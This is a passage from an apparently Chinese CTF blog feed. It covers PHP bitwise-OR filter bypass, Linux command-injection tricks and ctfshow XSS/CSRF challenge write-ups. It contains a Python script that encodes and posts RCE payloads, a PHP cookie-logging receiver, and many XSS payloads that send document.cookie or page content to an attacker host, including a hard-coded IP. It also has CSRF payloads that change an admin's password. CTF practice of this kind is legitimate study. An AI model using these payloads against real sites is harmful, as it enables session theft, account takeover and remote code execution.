运算符以及引号没有被过滤，因此我们可以选择使用位运算绕过。</p><p>我们要注意的是，如果我们只是将system('ls')通过位运算实现，这样的话输出的结果只会是 system('ls'), PHP会在eval中计算得到的字符串，但是并不会执行语句。等价于，eval执行的是echo("system('ls')");</p><p>要在PHP中利用字符串实现动态函数。我们可以先做个小实验：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-number">1</span>);            <span class="hljs-comment">//错误信息</span><br>ini_set(<span class="hljs-string">&#x27;display_startup_errors&#x27;</span>,<span class="hljs-number">1</span>);    <span class="hljs-comment">//php启动错误信息</span><br>error_reporting(-<span class="hljs-number">1</span>);                    <span class="hljs-comment">//打印出所有的 错误信息</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">customError</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span></span>)</span>&#123; <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;b&gt;Error:&lt;/b&gt; [<span class="hljs-subst">$errno</span>] <span class="hljs-subst">$errstr</span>&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//set error handler</span><br>set_error_handler(<span class="hljs-string">&quot;customError&quot;</span>);<br><span class="hljs-variable">$c</span> = (<span class="hljs-string">&#x27;system&#x27;</span>)(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;(&#x27;\x13\x19\x13\x14\x05\x0d&#x27;|&#x27;\x60\x60\x60\x60\x60\x60&#x27;)(&#x27;\x0c\x13&#x27;|&#x27;\x60\x60&#x27;)&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$d</span>);&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>当利用eval执行时，<span class="math inline">\(d从字符串变为执行语句（直观点的理解就是最外层的引号没了），等价于\)</span>c。</p><p>最后附上py脚本（如果只是一次的话，没必要生成文件，直接字典存在内存里就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">formDictionary</span>():</span><br>    ch_sum = []<br>    <span class="hljs-comment"># 找到符合条件的字符</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>        ch = <span class="hljs-built_in">chr</span>(i)<br>        re1 = re.match(<span class="hljs-string">r&quot;[0-9]|[a-z]|[A-Z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&quot;</span>,ch)<br>        <span class="hljs-keyword">if</span>(re1 == <span class="hljs-literal">None</span>):<br>            ch_sum.append(ch)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dic.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fout:<br>        result= []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ch_sum:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ch_sum:<br>                x = <span class="hljs-built_in">ord</span>(i)|<span class="hljs-built_in">ord</span>(j)<br>                <span class="hljs-keyword">if</span>(x&gt;=<span class="hljs-number">32</span> <span class="hljs-keyword">and</span> x&lt;=<span class="hljs-number">126</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> x <span class="hljs-keyword">in</span> result)):<br>                    result.append(x)<br>                    <span class="hljs-comment">#warning 这可能导致无法构造出\t,字符串split</span><br>                    fout.write(<span class="hljs-string">&quot;%&#123;:0&gt;2x&#125;\t%&#123;:0&gt;2x&#125;\t&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(i),<span class="hljs-built_in">ord</span>(j),<span class="hljs-built_in">chr</span>(x)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">formStr</span>(<span class="hljs-params">s</span>):</span><br>    s1=<span class="hljs-string">&quot;&quot;</span><br>    s2=<span class="hljs-string">&quot;&quot;</span><br>    dic = &#123;&#125;<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dic.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fin:<br>        <span class="hljs-keyword">for</span> lines <span class="hljs-keyword">in</span> fin:<br>            elem = (lines.split(<span class="hljs-string">&#x27;\t&#x27;</span>))<br>            dic[elem[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)] = (elem[<span class="hljs-number">0</span>],elem[<span class="hljs-number">1</span>])<br>        <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">if</span>(dic.get(i)!=<span class="hljs-literal">None</span>):<br>                s1 += dic[i][<span class="hljs-number">0</span>]<br>                s2 += dic[i][<span class="hljs-number">1</span>]<br>               <span class="hljs-comment"># print(&quot;&#123;&#125; : &#123;&#125;|&#123;&#125;&quot;.format(i,dic[i][0],dic[i][1]))</span><br>            <span class="hljs-keyword">else</span>:<br>                sys.exit(<span class="hljs-string">&quot;No answer&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;(\&#x27;&quot;</span>+s1+<span class="hljs-string">&quot;\&#x27;|\&#x27;&quot;</span>+s2+<span class="hljs-string">&quot;\&#x27;)&quot;</span><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    formDictionary()<br>    s0 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;function : &quot;</span>)<br>    s1 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;argc : &quot;</span>)<br>    s0_encode= formStr(s0)<br><br>    <span class="hljs-keyword">if</span> s1 == <span class="hljs-string">&quot;&quot;</span>:<br>        s1_encode = <span class="hljs-string">&quot;()&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        s1_encode=formStr(s1)<br><br>    <span class="hljs-comment"># warning : eval()需要补充 -&gt; ;</span><br>    <span class="hljs-built_in">print</span>(s0_encode+s1_encode + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-comment"># data=&#123;</span><br>    <span class="hljs-comment">#    &#x27;cmd&#x27;:urllib.parse.unquote(s0_encode + s1_encode + &quot;;&quot;)#注意使用quote</span><br>    <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-comment"># proxies = &#123;</span><br>    <span class="hljs-comment">#     &quot;http&quot; : &quot;127.0.0.1:8080&quot;</span><br>    <span class="hljs-comment">#     #&quot;http:&quot; : &quot;127.0.0.1:8080&quot;</span><br>    <span class="hljs-comment"># &#125;</span><br><br>    <span class="hljs-comment"># warning: 采用字符串的方式避免urlencode</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    data1 = <span class="hljs-string">&quot;cmd=&quot;</span> + s0_encode + s1_encode + <span class="hljs-string">&quot;;&quot;</span><br><br>    r = requests.post(url=<span class="hljs-string">&quot;http://localhost/www.mytest.cn/&quot;</span>,data=data1,headers=headers)<br>    <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="二python代码执行">二、Python代码执行</h2><h3 id="基础使用-1">1.1、基础使用</h3><p>Python代码执行也主要依赖两个函数，分别是eval和exec。</p>]]></content>
    
    
    <categories>
      
      <category>Web漏洞</category>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行总结</title>
    <link href="/2022/03/01/blog0001-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/01/blog0001-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>命令执行是最开始学习CTF接触到的内容，RCE大概是Web人最先领会到的攻防魅力。</p><p>由于CTF中的Web往往是围绕Linux展开，因此其中大部分的绕过技巧主要也是在Linux下使用。</p><span id="more"></span><h2 id="一命令执行">一、命令执行</h2><p>命令执行，指在Web应用程序中直接执行系统命令。</p><p>比如常见的PHP 命令执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;whoami&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在不同的语言中会有不同的命令执行方式，以下将会对常见的Web应用程序语言的命令执行方式做说明。</p><h3 id="php命令执行">1、PHP命令执行</h3><h3 id="python命令执行">2、Python命令执行</h3><h3 id="java命令执行">3、Java命令执行</h3><h3 id="node.js命令执行">4、node.js命令执行</h3><h2 id="二空格绕过">二、空格绕过</h2><h3 id="url编码绕过">1、URL编码绕过</h3><p>空格在URL编码中为%20</p><p>当空格被过滤时，我们可以使用%09（tab）或者%0a（回车）绕过</p><p><strong>使用%0a的使用范围有限,如PHP中调用system()函数，如果使用%0a无法实现效果。</strong></p><h3 id="shell变量绕过">2、shell变量绕过</h3><p>在Linux bash中，我们可以使用shell中预设的变量来绕过空格</p><p>如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">tac$</span><span class="bash">&#123;IFS&#125;flag.php</span><br><span class="hljs-meta">tac$</span><span class="bash">IFS<span class="hljs-variable">$1flag</span>.php</span><br><span class="hljs-meta">tac$</span><span class="bash">IFS<span class="hljs-variable">$9flag</span>.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 注意，kali默认为zsh环境，此时效果不一定成功</span><br></code></pre></td></tr></table></figure><h3 id="其他特殊符号替代">3、其他特殊符号替代</h3><p>当上述方法被禁止的时候，我们可以考虑使用shell重定向符号。</p><p><strong>当我们使用重定向符号时，不能再使用通配符来进行绕过。</strong></p><p>如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tac&lt;flag.php #代替 tac flag.php<br>tac&lt;&gt;flag.php<br></code></pre></td></tr></table></figure><h2 id="三敏感词绕过">三、敏感词绕过</h2><h3 id="通配符绕过">1、通配符绕过</h3><p>Linux bash常见的通配符：</p><ul><li>* ：匹配任意个字符</li><li>？：匹配单个字符</li></ul><p>如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">绕过简单的敏感词，实现文件的打开操作</span><br>tac fla*  #<br>tac fla?.php  #<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">字母被过滤时</span><br>???/????64 ????.??? <br><span class="hljs-meta">#</span><span class="bash">等价于实现了 bin/base64 flag.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 参考案例</span><br><span class="hljs-meta">if(isset($</span><span class="bash">_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;</span><br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="shell字符串拼接">2、shell字符串拼接</h3><p>Linux中shell字符串是可以拼接的,并且不需要额外的运算符。</p><p>那么我们可以得到以下3条等价的语句。</p><p>需要注意的是，如果第3条语句没有加上${}的分隔，将会被系统认为是$ag，这样得不到正确的结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">tac /flag.png<br>a=ag.png;tac /fl$a<br>a=ag.pn;tac /fl$&#123;a&#125;g<br></code></pre></td></tr></table></figure><p>我们也可以构造更为简单的payload,我们不需要引入额外的shell变量，直接利用“”这样的空字符串来实现拼接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tac /fl&quot;&quot;ag.png<br>tac /fla&#x27;&#x27;g.png<br></code></pre></td></tr></table></figure><h3 id="shell反斜杠转义">3、shell反斜杠转义</h3><p>shell中反斜杠是去除转移字符的特殊含义，这个与大多数的语言类似。</p><p>当反斜杠后接正常字符，在shell中相当于不处理。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 以下两个句子在shell测试，发现两者输出相同</span><br>echo flag.php<br>echo fla\g.php<br></code></pre></td></tr></table></figure><h3 id="运算符的运用">4、运算符的运用</h3><p>我们对运算符有如下的说明：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ; 命令间的分隔符</span><br>ls;whoami<br><span class="hljs-meta">#</span><span class="bash"> | 管道，将前一个输出重定向到下一个的标准输入</span><br>ls | whoami<br><span class="hljs-meta">#</span><span class="bash"> &amp; 进程并发，并发多个进程</span><br>ls &amp; whoami<br><span class="hljs-meta">#</span><span class="bash"> &amp;&amp; 逻辑运算，当且仅当前一个命令返回为真时执行下一个</span><br>ls &amp;&amp; whoami<br><span class="hljs-meta">#</span><span class="bash"> || 逻辑运算，当且仅当前一个命令返回为假时执行下一个</span><br>ls || whoami<br></code></pre></td></tr></table></figure><h3 id="文件读取">5、文件读取</h3><p>比赛里面常常会ban一堆文件读取的函数，这个只能自己总结了</p><p>grep可以直接查找文件内容</p><p>cat</p><p><a href="https://blog.csdn.net/JC_xxx/article/details/108921607">Linux 的文件读取指令</a></p><h3 id="eval逃逸">6、eval逃逸</h3><p>这个其实用处不是很大，大意如下，也就是将对c的过滤转移出去，这样可以在a上实现rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br><br>post: <br>c = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<br>a = system(<span class="hljs-string">&#x27;ls&#x27;</span>);    <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web漏洞</category>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-xss-wp</title>
    <link href="/2022/02/23/blog0004-ctfshow-xss-wp/"/>
    <url>/2022/02/23/blog0004-ctfshow-xss-wp/</url>
    
    <content type="html"><![CDATA[<p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p><p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p><p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p><span id="more"></span><p>反射型常见trick：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#python for temporary site</span><br>python3 <span class="hljs-literal">-m</span> http.server &#123;port&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#PHP for store the http request</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$log</span> = fopen(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>fwrite(<span class="hljs-variable">$log</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]);<br>fclose(<span class="hljs-variable">$log</span>);<br><span class="hljs-comment">//var_dump(scandir(&quot;.&quot;));</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span><br><span class="hljs-comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span><br><span class="hljs-comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试试(find / -name &quot;cookie.txt&quot;)</span><br></code></pre></td></tr></table></figure><h2 id="反射型web316---web326">反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p><p>不过会有各种过滤</p><p>附上payload，一般都试试，如果过不去了可以试试其他办法</p><p>xss平台：https://xss.pt/</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//首先是经典的img</span><br>&lt;script&gt;<br>    <span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;img&quot;</span>);<br>img.src = <span class="hljs-string">&quot;http://your-domain:port/&quot;</span>+<span class="hljs-built_in">document</span>.cookie;<br>&lt;/script&gt;<br><br><span class="hljs-comment">//location.href系列</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br><span class="hljs-comment">//iframe标签</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><br><span class="hljs-comment">//input标签</span><br>&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;<br>    <br>//svg标签<br>&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;<br>    <br>//body标签<br>&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;<br><br>//img标签<br>&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;<br>&lt;img src=&#x27;x&#x27; onclick=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;<br></code></pre></td></tr></table></figure><p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p><p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p><h2 id="存储型">存储型</h2><h3 id="web327">web327</h3><p>这题的难度并没有很大，主要是要理解向admin发送邮件，使得admin用户打开邮件，从而获取到admin用户的cookie值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body onload=<span class="hljs-string">&quot;window.open(&#x27;http://your-ip:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="web328">Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p><p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p><p>顺利搞到管理员的cookie</p><p>常见的body标签这次没成功，换了一个发现能打出来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframeonload=<span class="hljs-string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><h3 id="web-329获取html内容">Web 329（获取HTML内容）</h3><p>这题的方法和Web328是一样的，但是问题在于Cookie是有时效的，当Cookie被发送之后，则自动设置为无效了。类比一下现实情况，应该就是Cookie被设置了<code>HTTP-Only</code>，无法通过XSS获取到Cookie。</p><p>但是参照上一题，我们可以知道flag值是存储在一个form里面的，因此我们可以利用Js直接读取HTML页面内容，直接让XSS返回我们的flag值。</p><p>事实上我们在打的时候也不知道是具体flag值对应的下标，测试发现是1（其实应该也可以爆破</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe onload=<span class="hljs-string">&quot;window.open(&#x27;http://121.5.227.123:2333/?cookie=&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><h3 id="web330get-xss">web330（GET XSS）</h3><p>这算是非常经典的题型了，但其实应该算是CSRF攻击，在各种比赛里都有这个的影子。</p><p>简单来说，就是让管理员访问我们的恶意链接，由于没有csrf鉴权，因此可以直接利用连接修改密码。</p><p>附上payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe onload=<span class="hljs-string">&quot;window.open(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;)&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p>当然，由于之前的页面仍然存在，所以我们可以直接读取整个页面的内容，这样找到其中的flag，不过这应该算是非预期解。</p><h3 id="web331post-xss">web331（POST XSS）</h3><p>这道题的处理原理跟上一题是一样的理解，还是利用CSRF来实现admin用户的密码修改。</p><p>这次的修改密码参数利用POST方法传参，这里我们可以利用XMLHttpRequest</p><p>原型代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">var</span> httpRequest = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>    httpRequest.open(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://121.5.227.123/xss/cookie.php&#x27;</span>, <span class="hljs-literal">true</span>);<br>    httpRequest.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>    httpRequest.send(<span class="hljs-string">&#x27;p=1234567&#x27;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>转换成payload如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe onload=<span class="hljs-string">&quot;var httpRequest = new XMLHttpRequest();httpRequest.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1/api/change.php&#x27;, true);httpRequest.setRequestHeader(&#x27;Content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);httpRequest.send(&#x27;p=123456&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p>当然也可以利用fetch来做：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">let</span> res = fetch(<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>, &#123;<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<br>        <span class="hljs-attr">body</span>: <span class="hljs-string">&#x27;p=12345678&#x27;</span>,<br>        <span class="hljs-attr">headers</span>: &#123;<br>            <span class="hljs-string">&#x27;Content-type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        &#125;,<br>    &#125;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="web332转账xss">web332（转账XSS）</h3><p>这道题在之前的极客大挑战也有出现过，还是CSRF的鉴权漏洞</p><p>POST型XSS获取内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe onload=<span 